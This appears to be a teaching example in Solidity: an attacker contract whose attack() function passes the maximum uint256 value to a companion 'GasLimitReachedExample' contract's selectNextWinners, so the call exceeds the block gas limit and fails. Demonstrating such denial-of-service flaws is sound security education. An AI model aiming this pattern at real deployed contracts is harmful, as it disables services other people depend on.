// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.23;

import "./GasLimitReachedExample.sol";

contract GasLimitAttack {
    GasLimitReachedExample public victimContract;

    // Initialize with the address of the victim contract
    constructor(address _victimContractAddress) {
        victimContract = GasLimitReachedExample(_victimContractAddress);
    }

    // Function to launch the attack
    function attack() public {
        // Pass a very large value to the selectNextWinners function
        uint256 largeNumber = 2 ** 256 - 1;

        // This will consume more gas than the block limit, causing the transaction to fail
        victimContract.selectNextWinners(largeNumber);
    }
}
